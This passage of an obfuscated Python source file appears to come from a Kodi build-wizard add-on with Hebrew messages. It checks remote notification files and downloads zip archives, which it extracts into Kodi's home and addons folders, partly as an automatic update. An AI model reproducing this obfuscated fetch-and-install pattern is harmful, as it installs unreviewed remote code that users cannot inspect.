		OOOO0O0OO0OO0O0OO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOO0O0OO0O0OOOO00 )#line:5148
		if OOOO0O0OO0OO0O0OO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5149
		else :wiz .purgeDb (OO0OOOO0OO0OOOOO0 [O0OO0O0OO0O00O000 ])#line:5150
def fastupdatefirstbuild (OOO00OO00OOOOOOOO ):#line:5156
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5158
	if ENABLE =='Yes':#line:5159
		if not NOTIFY =='true':#line:5160
			OOO000O00OOO0O00O =wiz .workingURL (NOTIFICATION )#line:5161
			if OOO000O00OOO0O00O ==True :#line:5162
				O000O00O00OO00O00 ,OOOO0OO000OO0OO0O =wiz .splitNotify (NOTIFICATION )#line:5163
				if not O000O00O00OO00O00 ==False :#line:5165
					try :#line:5166
						O000O00O00OO00O00 =int (O000O00O00OO00O00 );OOO00OO00OOOOOOOO =int (OOO00OO00OOOOOOOO )#line:5167
						checkidupdate ()#line:5168
						wiz .setS ("notedismiss","true")#line:5169
						if O000O00O00OO00O00 ==OOO00OO00OOOOOOOO :#line:5170
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O000O00O00OO00O00 ),xbmc .LOGNOTICE )#line:5171
						elif O000O00O00OO00O00 >OOO00OO00OOOOOOOO :#line:5173
							wiz .log ("[Notifications] id: %s"%str (O000O00O00OO00O00 ),xbmc .LOGNOTICE )#line:5174
							wiz .setS ('noteid',str (O000O00O00OO00O00 ))#line:5175
							wiz .setS ("notedismiss","true")#line:5176
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5179
					except Exception as OOO0O0O000O0O0OO0 :#line:5180
						wiz .log ("Error on Notifications Window: %s"%str (OOO0O0O000O0O0OO0 ),xbmc .LOGERROR )#line:5181
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5183
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOO000O00OOO0O00O ),xbmc .LOGNOTICE )#line:5184
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5185
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5186
def checkUpdate ():#line:5188
	O0O00O0000O0O0OOO =wiz .getS ('disableupdate')#line:5189
	O0OO0O0O0OOO0O0O0 =wiz .getS ('buildname')#line:5190
	OOOOOO00O0O0O0O00 =wiz .getS ('buildversion')#line:5191
	O000O00O0OO00O0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5192
	OOO00OOOO0OO0O00O =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0OO0O0O0OOO0O0O0 ).findall (O000O00O0OO00O0O0 )#line:5193
	if len (OOO00OOOO0OO0O00O )>0 :#line:5194
		OO0OOOO00OOOOOO00 =OOO00OOOO0OO0O00O [0 ][0 ]#line:5195
		OO000O0O0O0OO00OO =OOO00OOOO0OO0O00O [0 ][1 ]#line:5196
		OO0O0O0OOOOO0O0OO =OOO00OOOO0OO0O00O [0 ][2 ]#line:5197
		wiz .setS ('latestversion',OO0OOOO00OOOOOO00 )#line:5198
		if OO0OOOO00OOOOOO00 >OOOOOO00O0O0O0O00 :#line:5199
			if O0O00O0000O0O0OOO =='false':#line:5200
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OOOOOO00O0O0O0O00 ,OO0OOOO00OOOOOO00 ),xbmc .LOGNOTICE )#line:5201
				notify .updateWindow (O0OO0O0O0OOO0O0O0 ,OOOOOO00O0O0O0O00 ,OO0OOOO00OOOOOO00 ,OO000O0O0O0OO00OO ,OO0O0O0OOOOO0O0OO )#line:5202
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OOOOOO00O0O0O0O00 ,OO0OOOO00OOOOOO00 ),xbmc .LOGNOTICE )#line:5203
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OOOOOO00O0O0O0O00 ,OO0OOOO00OOOOOO00 ),xbmc .LOGNOTICE )#line:5204
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5205
def updatetelemedia (O0O0O000O00O0OOOO ):#line:5206
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5207
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5208
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5209
    wiz .wizardUpdate ('startup')#line:5210
    checkUpdate ()#line:5212
    time .sleep (15.0 )#line:5214
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5215
        O000O00OOO0OOO00O =(ADDON .getSetting ("autoupdate"))#line:5216
        STARTP2 ()#line:5217
        if not NOTIFY =='true':#line:5218
            O00O0O00000OOOO00 =wiz .workingURL (NOTIFICATION )#line:5219
            if O00O0O00000OOOO00 ==True :#line:5220
                OOOOOOOOO00OOOOO0 ,OO0000O0O0O0OO0O0 =wiz .splitNotify (NOTIFICATION )#line:5221
                if not OOOOOOOOO00OOOOO0 ==False :#line:5222
                    try :#line:5223
                        OOOOOOOOO00OOOOO0 =int (OOOOOOOOO00OOOOO0 );O0O0O000O00O0OOOO =int (O0O0O000O00O0OOOO )#line:5224
                        if OOOOOOOOO00OOOOO0 ==O0O0O000O00O0OOOO :#line:5225
                            if NOTEDISMISS =='false':#line:5226
                                debridit .debridIt ('update','all')#line:5227
                                traktit .traktIt ('update','all')#line:5228
                                checkidupdatetele ()#line:5229
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOOOOOOO00OOOOO0 ),xbmc .LOGNOTICE )#line:5230
                        elif OOOOOOOOO00OOOOO0 >O0O0O000O00O0OOOO :#line:5231
                            wiz .log ("[Notifications] id: %s"%str (OOOOOOOOO00OOOOO0 ),xbmc .LOGNOTICE )#line:5232
                            wiz .setS ('noteid',str (OOOOOOOOO00OOOOO0 ))#line:5233
                            wiz .setS ('notedismiss','false')#line:5234
                            if O000O00OOO0OOO00O =='true':#line:5235
                                debridit .debridIt ('update','all')#line:5236
                                traktit .traktIt ('update','all')#line:5237
                                checkidupdatetele ()#line:5238
                            else :notify .notification (msg =OO0000O0O0O0OO0O0 )#line:5239
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5240
                    except Exception as O0O00000OO000OO00 :#line:5241
                        wiz .log ("Error on Notifications Window: %s"%str (O0O00000OO000OO00 ),xbmc .LOGERROR )#line:5242
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5243
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00O0O00000OOOO00 ),xbmc .LOGNOTICE )#line:5244
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5245
def checkidupdate ():#line:5249
				wiz .setS ("notedismiss","true")#line:5251
				O0O00O00OOOOO00O0 =wiz .workingURL (NOTIFICATION )#line:5252
				O0000OOOOOO00OOOO =" Kodi Premium"#line:5254
				O000OO0O0O0OO00OO =wiz .checkBuild (O0000OOOOOO00OOOO ,'gui')#line:5255
				O0O000OO0O0OOO0OO =O0000OOOOOO00OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5256
				if not wiz .workingURL (O000OO0O0O0OO00OO )==True :return #line:5257
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5258
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0000OOOOOO00OOOO ),'','אנא המתן')#line:5259
				O00OO000O0OO00O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O000OO0O0OOO0OO )#line:5260
				try :os .remove (O00OO000O0OO00O0O )#line:5261
				except :pass #line:5262
				logging .warning (O000OO0O0O0OO00OO )#line:5263
				if 'google'in O000OO0O0O0OO00OO :#line:5264
				   O00OO0O0O0OO0OOO0 =googledrive_download (O000OO0O0O0OO00OO ,O00OO000O0OO00O0O ,DP ,wiz .checkBuild (O0000OOOOOO00OOOO ,'filesize'))#line:5265
				else :#line:5268
				  downloader .download (O000OO0O0O0OO00OO ,O00OO000O0OO00O0O ,DP )#line:5269
				xbmc .sleep (100 )#line:5270
				O000000O0OOO0000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOOOOO00OOOO )#line:5271
				DP .update (0 ,O000000O0OOO0000O ,'','אנא המתן')#line:5272
				extract .all (O00OO000O0OO00O0O ,HOME ,DP ,title =O000000O0OOO0000O )#line:5273
				DP .close ()#line:5274
				wiz .defaultSkin ()#line:5275
				wiz .lookandFeelData ('save')#line:5276
				if KODIV >=18 :#line:5277
					skindialogsettind18 ()#line:5278
				if INSTALLMETHOD ==1 :O0OO0OO0O00OOO0O0 =1 #line:5281
				elif INSTALLMETHOD ==2 :O0OO0OO0O00OOO0O0 =0 #line:5282
				else :DP .close ()#line:5283
def checkidupdatetele ():#line:5284
				wiz .setS ("notedismiss","true")#line:5286
				OOOOOO0OO0OOOO00O =wiz .workingURL (NOTIFICATION )#line:5287
				O000OOO0O0OO0OO00 =" Kodi Premium"#line:5289
				OO000OOO00OO0O00O =wiz .checkBuild (O000OOO0O0OO0OO00 ,'gui')#line:5290
				O00O0OO0OO000000O =O000OOO0O0OO0OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5291
				if not wiz .workingURL (OO000OOO00OO0O00O )==True :return #line:5292
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5293
				O0OOOO0OO000O00O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OO0OO000000O )#line:5296
				try :os .remove (O0OOOO0OO000O00O0 )#line:5297
				except :pass #line:5298
				if 'google'in OO000OOO00OO0O00O :#line:5300
				   OOO00000000OOO0O0 =googledrive_download (OO000OOO00OO0O00O ,O0OOOO0OO000O00O0 ,DP2 ,wiz .checkBuild (O000OOO0O0OO0OO00 ,'filesize'))#line:5301
				else :#line:5304
				  downloaderbg .download3 (OO000OOO00OO0O00O ,O0OOOO0OO000O00O0 ,DP2 )#line:5305
				xbmc .sleep (100 )#line:5306
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5307
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5309
				extract .all2 (O0OOOO0OO000O00O0 ,HOME ,DP2 )#line:5311
				DP2 .close ()#line:5312
				wiz .defaultSkin ()#line:5313
				wiz .lookandFeelData ('save')#line:5314
				wiz .kodi17Fix ()#line:5315
				if KODIV >=18 :#line:5316
					skindialogsettind18 ()#line:5317
				debridit .debridIt ('restore','all')#line:5322
				traktit .traktIt ('restore','all')#line:5323
				if INSTALLMETHOD ==1 :OOOO00O0OO0OO0O00 =1 #line:5324
				elif INSTALLMETHOD ==2 :OOOO00O0OO0OO0O00 =0 #line:5325
				else :DP2 .close ()#line:5326
				OO0O0O0OO000OOO0O =(NOTIFICATION2 )#line:5327
				O000OOOO0OOO000O0 =urllib2 .urlopen (OO0O0O0OO000OOO0O )#line:5328
				OOOO0000OO0OO0OO0 =O000OOOO0OOO000O0 .readlines ()#line:5329
				O00O0O0O0000OO0OO =0 #line:5330
				for O0O000000OO000OOO in OOOO0000OO0OO0OO0 :#line:5333
					if O0O000000OO000OOO .split (' ==')[0 ]=="noreset"or O0O000000OO000OOO .split ()[0 ]=="noreset":#line:5334
						xbmc .executebuiltin ("ReloadSkin()")#line:5336
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5337
						O00OO00O000OOO00O =(ADDON .getSetting ("message"))#line:5338
						if O00OO00O000OOO00O =='true':#line:5339
							infobuild ()#line:5340
						update_Votes ()#line:5341
						indicatorfastupdate ()#line:5342
					if O0O000000OO000OOO .split (' ==')[0 ]=="reset"or O0O000000OO000OOO .split ()[0 ]=="reset":#line:5343
						update_Votes ()#line:5345
						indicatorfastupdate ()#line:5346
						resetkodi ()#line:5347
def gaiaserenaddon ():#line:5348
  O00OOO00O0OO000O0 =(ADDON .getSetting ("gaiaseren"))#line:5349
  O0OOO0OO000OO0OO0 =(ADDON .getSetting ("auto_rd"))#line:5350
  if O00OOO00O0OO000O0 =='true'and O0OOO0OO000OO0OO0 =='true':#line:5351
    OOO0OOOO0O00O0OOO =(NEWFASTUPDATE )#line:5352
    O0000O0OOOOOOO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5353
    O0O0O0OO0O0OOOOOO =xbmcgui .DialogProgress ()#line:5354
    O0O0O0OO0O0OOOOOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5355
    OO00O0OO0000O00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5356
    O000O0OOOO000OOO0 =urllib2 .Request (OOO0OOOO0O00O0OOO )#line:5357
    O000O0OO000OO00OO =urllib2 .urlopen (O000O0OOOO000OOO0 )#line:5358
    O0O0OOO0OO00OOO00 =xbmcgui .DialogProgress ()#line:5360
    O0O0OOO0OO00OOO00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5361
    O0O0OOO0OO00OOO00 .update (0 )#line:5362
    OO00OOO000OO00O0O =open (OO00O0OO0000O00O0 ,'wb')#line:5364
    try :#line:5366
      OO000000O0O0OO0OO =O000O0OO000OO00OO .info ().getheader ('Content-Length').strip ()#line:5367
      O0O000O0O0OO0O0O0 =True #line:5368
    except AttributeError :#line:5369
          O0O000O0O0OO0O0O0 =False #line:5370
    if O0O000O0O0OO0O0O0 :#line:5372
          OO000000O0O0OO0OO =int (OO000000O0O0OO0OO )#line:5373
    O0OO0O0O0O00000OO =0 #line:5375
    OO0OO0OOO0O00OO00 =time .time ()#line:5376
    while True :#line:5377
          OO00OO0O0000OOO00 =O000O0OO000OO00OO .read (8192 )#line:5378
          if not OO00OO0O0000OOO00 :#line:5379
              sys .stdout .write ('\n')#line:5380
              break #line:5381
          O0OO0O0O0O00000OO +=len (OO00OO0O0000OOO00 )#line:5383
          OO00OOO000OO00O0O .write (OO00OO0O0000OOO00 )#line:5384
          if not O0O000O0O0OO0O0O0 :#line:5386
              OO000000O0O0OO0OO =O0OO0O0O0O00000OO #line:5387
          if O0O0OOO0OO00OOO00 .iscanceled ():#line:5388
             O0O0OOO0OO00OOO00 .close ()#line:5389
             try :#line:5390
              os .remove (OO00O0OO0000O00O0 )#line:5391
             except :#line:5392
              pass #line:5393
             break #line:5394
          O000OOOO0OO0O0000 =float (O0OO0O0O0O00000OO )/OO000000O0O0OO0OO #line:5395
          O000OOOO0OO0O0000 =round (O000OOOO0OO0O0000 *100 ,2 )#line:5396
          O00O0O000OO00OOO0 =O0OO0O0O0O00000OO /(1024 *1024 )#line:5397
          OOO00O00O000OO000 =OO000000O0O0OO0OO /(1024 *1024 )#line:5398
          OOOO0O0O0OO0O0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0O000OO00OOO0 ,'teal',OOO00O00O000OO000 )#line:5399
          if (time .time ()-OO0OO0OOO0O00OO00 )>0 :#line:5400
            O0OO0O0OO00OO0000 =O0OO0O0O0O00000OO /(time .time ()-OO0OO0OOO0O00OO00 )#line:5401
            O0OO0O0OO00OO0000 =O0OO0O0OO00OO0000 /1024 #line:5402
          else :#line:5403
           O0OO0O0OO00OO0000 =0 #line:5404
          OOOOO0000O0OO0O00 ='KB'#line:5405
          if O0OO0O0OO00OO0000 >=1024 :#line:5406
             O0OO0O0OO00OO0000 =O0OO0O0OO00OO0000 /1024 #line:5407
             OOOOO0000O0OO0O00 ='MB'#line:5408
          if O0OO0O0OO00OO0000 >0 and not O000OOOO0OO0O0000 ==100 :#line:5409
              OOOO0OOO0O0O0O0OO =(OO000000O0O0OO0OO -O0OO0O0O0O00000OO )/O0OO0O0OO00OO0000 #line:5410
          else :#line:5411
              OOOO0OOO0O0O0O0OO =0 #line:5412
          OO000O0OOO0O0O00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0O0OO00OO0000 ,OOOOO0000O0OO0O00 )#line:5413
          O0O0OOO0OO00OOO00 .update (int (O000OOOO0OO0O0000 ),OOOO0O0O0OO0O0O00 ,OO000O0OOO0O0O00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5415
    OOOOOOO0000O000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5418
    OO00OOO000OO00O0O .close ()#line:5421
    extract .all (OO00O0OO0000O00O0 ,OOOOOOO0000O000O0 ,O0O0OOO0OO00OOO00 )#line:5422
    try :#line:5426
      os .remove (OO00O0OO0000O00O0 )#line:5427
    except :#line:5428
      pass #line:5429
def iptvsimpldownpc ():#line:5430
    O0OOO0OO00O0OOO00 =(IPTVSIMPL18PC )#line:5432
    O00000OOO0OOO00O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5433
    OO0OOOO0OO0O0O00O =xbmcgui .DialogProgress ()#line:5434
    OO0OOOO0OO0O0O00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5435
    OO00OOO000O0OOOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5436
    O00OOOO0O0OO00OOO =urllib2 .Request (O0OOO0OO00O0OOO00 )#line:5437
    O000OOOO00O000OOO =urllib2 .urlopen (O00OOOO0O0OO00OOO )#line:5438
    OO0000OOO0O00000O =xbmcgui .DialogProgress ()#line:5440
    OO0000OOO0O00000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5441
    OO0000OOO0O00000O .update (0 )#line:5442
    O00O0O00OO0OOO00O =open (OO00OOO000O0OOOO0 ,'wb')#line:5444
    try :#line:5446
      OO00O0O00000OO0OO =O000OOOO00O000OOO .info ().getheader ('Content-Length').strip ()#line:5447
      O000O00O0O00000O0 =True #line:5448
    except AttributeError :#line:5449
          O000O00O0O00000O0 =False #line:5450
    if O000O00O0O00000O0 :#line:5452
          OO00O0O00000OO0OO =int (OO00O0O00000OO0OO )#line:5453
    O0OOO00OOOOOOO000 =0 #line:5455
    OOOO0O00OO0O0O000 =time .time ()#line:5456
    while True :#line:5457
          O0000O00OOO000OOO =O000OOOO00O000OOO .read (8192 )#line:5458
          if not O0000O00OOO000OOO :#line:5459
              sys .stdout .write ('\n')#line:5460
              break #line:5461
          O0OOO00OOOOOOO000 +=len (O0000O00OOO000OOO )#line:5463
          O00O0O00OO0OOO00O .write (O0000O00OOO000OOO )#line:5464
          if not O000O00O0O00000O0 :#line:5466
              OO00O0O00000OO0OO =O0OOO00OOOOOOO000 #line:5467
          if OO0000OOO0O00000O .iscanceled ():#line:5468
             OO0000OOO0O00000O .close ()#line:5469
             try :#line:5470
              os .remove (OO00OOO000O0OOOO0 )#line:5471
             except :#line:5472
              pass #line:5473
             break #line:5474
          O000O000OO00OOOO0 =float (O0OOO00OOOOOOO000 )/OO00O0O00000OO0OO #line:5475
          O000O000OO00OOOO0 =round (O000O000OO00OOOO0 *100 ,2 )#line:5476
          O0OOO0OO0O0O0O0OO =O0OOO00OOOOOOO000 /(1024 *1024 )#line:5477
          O0OOOO0O00O000O00 =OO00O0O00000OO0OO /(1024 *1024 )#line:5478
          O0OOO00OO0000O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO0OO0O0O0O0OO ,'teal',O0OOOO0O00O000O00 )#line:5479
          if (time .time ()-OOOO0O00OO0O0O000 )>0 :#line:5480
            OOO0OOO00OOO00OO0 =O0OOO00OOOOOOO000 /(time .time ()-OOOO0O00OO0O0O000 )#line:5481
            OOO0OOO00OOO00OO0 =OOO0OOO00OOO00OO0 /1024 #line:5482
          else :#line:5483
           OOO0OOO00OOO00OO0 =0 #line:5484
          OO000O0000OOOO0OO ='KB'#line:5485
          if OOO0OOO00OOO00OO0 >=1024 :#line:5486
             OOO0OOO00OOO00OO0 =OOO0OOO00OOO00OO0 /1024 #line:5487
             OO000O0000OOOO0OO ='MB'#line:5488
          if OOO0OOO00OOO00OO0 >0 and not O000O000OO00OOOO0 ==100 :#line:5489
              O0O0000O00OOO0O00 =(OO00O0O00000OO0OO -O0OOO00OOOOOOO000 )/OOO0OOO00OOO00OO0 #line:5490
          else :#line:5491
              O0O0000O00OOO0O00 =0 #line:5492
          O00O0OO0OO00OO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OOO00OOO00OO0 ,OO000O0000OOOO0OO )#line:5493
          OO0000OOO0O00000O .update (int (O000O000OO00OOOO0 ),O0OOO00OO0000O000 ,O00O0OO0OO00OO00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5495
    O000OO0OO00O0OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5498
    O00O0O00OO0OOO00O .close ()#line:5501
    extract .all (OO00OOO000O0OOOO0 ,O000OO0OO00O0OOOO ,OO0000OOO0O00000O )#line:5502
    try :#line:5506
      os .remove (OO00OOO000O0OOOO0 )#line:5507
    except :#line:5508
      pass #line:5509
def iptvsimpldown ():#line:5510
    OOOOO000O000O0O00 =(IPTV18 )#line:5512
    O0O0O0000OOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5513
    OOOO00O000OOOOO0O =xbmcgui .DialogProgress ()#line:5514
    OOOO00O000OOOOO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5515
    O0O00O00O00O0O00O =os .path .join (PACKAGES ,'isr.zip')#line:5516
    OOOO0O00O0000000O =urllib2 .Request (OOOOO000O000O0O00 )#line:5517
    O0O00O00O0OO000O0 =urllib2 .urlopen (OOOO0O00O0000000O )#line:5518
    OOOOOOO0000O00O0O =xbmcgui .DialogProgress ()#line:5520
    OOOOOOO0000O00O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5521
    OOOOOOO0000O00O0O .update (0 )#line:5522
    O000000O0000O00O0 =open (O0O00O00O00O0O00O ,'wb')#line:5524
    try :#line:5526
      O0000OO00OO0OOO00 =O0O00O00O0OO000O0 .info ().getheader ('Content-Length').strip ()#line:5527
      OO0OO00O0O0O0OOO0 =True #line:5528
    except AttributeError :#line:5529
          OO0OO00O0O0O0OOO0 =False #line:5530
    if OO0OO00O0O0O0OOO0 :#line:5532
          O0000OO00OO0OOO00 =int (O0000OO00OO0OOO00 )#line:5533
    O0O00O0O0OOOO00OO =0 #line:5535
    OOO00O0OO0OO000O0 =time .time ()#line:5536
    while True :#line:5537
          OOOOO00OO000O00OO =O0O00O00O0OO000O0 .read (8192 )#line:5538
          if not OOOOO00OO000O00OO :#line:5539
              sys .stdout .write ('\n')#line:5540
              break #line:5541
          O0O00O0O0OOOO00OO +=len (OOOOO00OO000O00OO )#line:5543
          O000000O0000O00O0 .write (OOOOO00OO000O00OO )#line:5544
          if not OO0OO00O0O0O0OOO0 :#line:5546
              O0000OO00OO0OOO00 =O0O00O0O0OOOO00OO #line:5547
          if OOOOOOO0000O00O0O .iscanceled ():#line:5548
             OOOOOOO0000O00O0O .close ()#line:5549
             try :#line:5550
              os .remove (O0O00O00O00O0O00O )#line:5551
             except :#line:5552
              pass #line:5553
             break #line:5554
          OOO0O00OOOO0000OO =float (O0O00O0O0OOOO00OO )/O0000OO00OO0OOO00 #line:5555
          OOO0O00OOOO0000OO =round (OOO0O00OOOO0000OO *100 ,2 )#line:5556
          OOOOO0OO00000O000 =O0O00O0O0OOOO00OO /(1024 *1024 )#line:5557
          OO0000O00OOO0OOO0 =O0000OO00OO0OOO00 /(1024 *1024 )#line:5558
          OOO000O0O00000OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO0OO00000O000 ,'teal',OO0000O00OOO0OOO0 )#line:5559
          if (time .time ()-OOO00O0OO0OO000O0 )>0 :#line:5560
            OO00OOOOOOOO0O000 =O0O00O0O0OOOO00OO /(time .time ()-OOO00O0OO0OO000O0 )#line:5561
            OO00OOOOOOOO0O000 =OO00OOOOOOOO0O000 /1024 #line:5562
          else :#line:5563
           OO00OOOOOOOO0O000 =0 #line:5564
          O0O0OOOOOOO000000 ='KB'#line:5565
          if OO00OOOOOOOO0O000 >=1024 :#line:5566
             OO00OOOOOOOO0O000 =OO00OOOOOOOO0O000 /1024 #line:5567
             O0O0OOOOOOO000000 ='MB'#line:5568
          if OO00OOOOOOOO0O000 >0 and not OOO0O00OOOO0000OO ==100 :#line:5569
              OO000000000O00O0O =(O0000OO00OO0OOO00 -O0O00O0O0OOOO00OO )/OO00OOOOOOOO0O000 #line:5570
          else :#line:5571
              OO000000000O00O0O =0 #line:5572
          OO0O000O0OO0OOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00OOOOOOOO0O000 ,O0O0OOOOOOO000000 )#line:5573
          OOOOOOO0000O00O0O .update (int (OOO0O00OOOO0000OO ),OOO000O0O00000OO0 ,OO0O000O0OO0OOO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5575
    O0000OOO0O0O0O0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5578
    O000000O0000O00O0 .close ()#line:5581
    extract .all (O0O00O00O00O0O00O ,O0000OOO0O0O0O0OO ,OOOOOOO0000O00O0O )#line:5582
    try :#line:5586
      os .remove (O0O00O00O00O0O00O )#line:5587
    except :#line:5588
      pass #line:5589
def testnotify ():#line:5590
	O000O0000OO00O00O =wiz .workingURL (NOTIFICATION )#line:5591
	if O000O0000OO00O00O ==True :#line:5592
		try :#line:5593
			OO0O0O0OO0O0000OO ,O000000000OO00O00 =wiz .splitNotify (NOTIFICATION )#line:5594
			if OO0O0O0OO0O0000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5595
			if STARTP2 ()=='ok':#line:5596
				notify .notification (O000000000OO00O00 ,True )#line:5597
		except Exception as O000O00OO00000O0O :#line:5598
			wiz .log ("Error on Notifications Window: %s"%str (O000O00OO00000O0O ),xbmc .LOGERROR )#line:5599
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5600
def testnotify2 ():#line:5601
	OOOO000OO000OO0O0 =wiz .workingURL (NOTIFICATION2 )#line:5602
	if OOOO000OO000OO0O0 ==True :#line:5603
		try :#line:5604
			O000OOO00O00000O0 ,O00O0OO0OO00OO000 =wiz .splitNotify (NOTIFICATION2 )#line:5605
			if O000OOO00O00000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5606
			if STARTP2 ()=='ok':#line:5607
				notify .notification2 (O00O0OO0OO00OO000 ,True )#line:5608
		except Exception as OOOOO00OOOO0O00O0 :#line:5609
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO00OOOO0O00O0 ),xbmc .LOGERROR )#line:5610
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5611
def testnotify3 ():#line:5612
	O000O0OO00000O0O0 =wiz .workingURL (NOTIFICATION3 )#line:5613
	if O000O0OO00000O0O0 ==True :#line:5614
		try :#line:5615
			O0O00OOOOOOOO0O0O ,OO0OOOOOOO0000000 =wiz .splitNotify (NOTIFICATION3 )#line:5616
			if O0O00OOOOOOOO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5617
			if STARTP2 ()=='ok':#line:5618
				notify .notification3 (OO0OOOOOOO0000000 ,True )#line:5619
		except Exception as O0O0O0OOOOOOOO00O :#line:5620
			wiz .log ("Error on Notifications Window: %s"%str (O0O0O0OOOOOOOO00O ),xbmc .LOGERROR )#line:5621
